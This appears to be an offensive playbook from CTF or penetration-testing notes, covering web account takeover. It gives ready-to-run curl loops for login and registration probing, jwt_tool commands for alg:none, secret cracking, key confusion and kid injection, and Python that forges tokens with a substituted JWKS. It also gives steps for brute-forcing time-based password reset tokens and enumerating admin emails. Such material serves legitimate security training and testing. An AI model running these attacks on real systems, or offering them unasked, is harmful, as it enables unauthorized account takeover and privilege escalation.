# Auth — account access, JWT, password reset flows

## 1. Get an account

With creds, try each login endpoint (JSON and form-encoded):

```bash
for p in /login /api/login /auth /api/auth; do
  echo "=== $p ==="
  curl -si -X POST <target>$p -H 'Content-Type: application/json' \
    -d '{"username":"<user>","password":"<pass>"}'
done
curl -si -X POST <target>/login -d 'username=<user>&password=<pass>'
```

No creds → open registration:

```bash
for p in /register /api/register /api/signup; do
  echo "=== $p ==="
  curl -si -X POST <target>$p -H 'Content-Type: application/json' \
    -d '{"username":"testuser","email":"test@test.com","password":"Test1234!"}'
done
```

### After successful auth

Record the working endpoint, mechanism, and **all** user data returned (id, role, org, permissions).

- Bearer token → `AUTH_HEADER='-H "Authorization: Bearer <token>"'`
- Set-Cookie → `AUTH_HEADER='-b "<name>=<value>"'`
- `YOUR_ID=<id>` from the response (needed for IDOR). If absent, fetch `/api/profile` or `/api/me`.

JWT returned → decode and run the fast-track immediately:
```bash
python /c/Tools/jwt_tool/jwt_tool.py <token>
```

## 2. JWT fast-track

```bash
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X a   # alg:none
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -C -d /c/Tools/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
```

If it cracks or alg:none lands, forge with `role=admin`, `isAdmin=true`, `userId=1`:
```bash
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<cracked-secret>"
```

**Timebox this.** A full rockyou run (14M) plus a targeted app-themed list is ~5 minutes and usually proves the secret is random. If both fail, mark JWT-forge as killed in `WORKLOG.md` and move on — do not return to it without new information (a leaked secret, a JWKS write primitive). Also verify the verifier actually rejects unsigned tokens (`alg: none/None/NONE/nOnE` × empty/garbage signature) before concluding.

## 3. JWT deep-dive (only with a new primitive)

```bash
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
```

### JWKS substitution (requires upload write-traversal — see traversal-upload.md)

```python
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, os
os.makedirs('C:/Tools/CTF/<challenge-name>/exploits', exist_ok=True)
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = private_key.public_key().public_numbers()
def b64u(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l,'big')).rstrip(b'=').decode()
kid = "pwned"
jwks = {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}
open('C:/Tools/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
    private_key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
json.dump(jwks, open('C:/Tools/CTF/<challenge-name>/exploits/jwks.json','w'))
print("Done. KID:", kid)
EOF
```

Overwrite the server JWKS, verify, then forge — match the claim name the app's verify function reads (`user_id`/`sub`/`id`/`userId`):

```python
import jwt
from cryptography.hazmat.primitives.serialization import load_pem_private_key
key = load_pem_private_key(open('.../private_key.pem','rb').read(), password=None)
print(jwt.encode({"user_id": "<target-uuid>"}, key, algorithm="RS256",
                 headers={"kid":"pwned","alg":"RS256","typ":"JWT"}))
```

Re-probe every previously-403'd endpoint after each forge attempt.

## 4. Password reset / forgot-password flows

Often the softest path to admin. Map the flow first: `POST /api/forgot-password {email}` → token → `POST /api/reset-password {token,password}`.

**Inspect the token's entropy before attacking anything else.** Request one for your own account, read it, and test whether it's derived from time:

```bash
python -c "print(int('<token>',16))"   # compare against the mail timestamp in epoch ms
```

A token equal to `Date.now().toString(16)` has **zero entropy** — it's a hex millisecond. To exploit, you need the generation instant:
- any endpoint that echoes server time (telemetry, logs, debug, `Date` response header)
- the `Date` header alone bounds it to a 1000-candidate window
- request/response latency brackets it further

Then brute the window against `reset-password` (a few hundred candidates, ~16 threads).

**Finding the target's email address.** Prefer an oracle on the **write path** over a side-effect path:
- *Write path (reliable):* registration uniqueness. `POST /api/register` with a throwaway unique username + candidate email → a combined `"Username or email already exists"` proves the **email** exists.
- *Side-effect path (unreliable):* "did a reset email arrive in the dev mailbox?" — routinely filtered for seeded/admin accounts and will give **false negatives**. On Tanuki `admin@tanuki.app` was in the first six guesses, produced no mail, and got wrongly eliminated; the register oracle flagged it instantly.

Never let one negative oracle eliminate a candidate. Confirm with a structurally different second oracle.

Also test on the reset endpoint:
- extra body fields to retarget the account (`username`, `user_id`, `id`, `email`, `target`) — mass assignment
- SQL/NoSQL metacharacters and `%`/`_` LIKE wildcards in the email lookup
- alternate field names on forgot-password (`username`, `login`, `identifier`)
- whether a dev "mailcatcher" page (`/api/email`, `/mail`, `/dev/mail`) is reachable **unauthenticated**
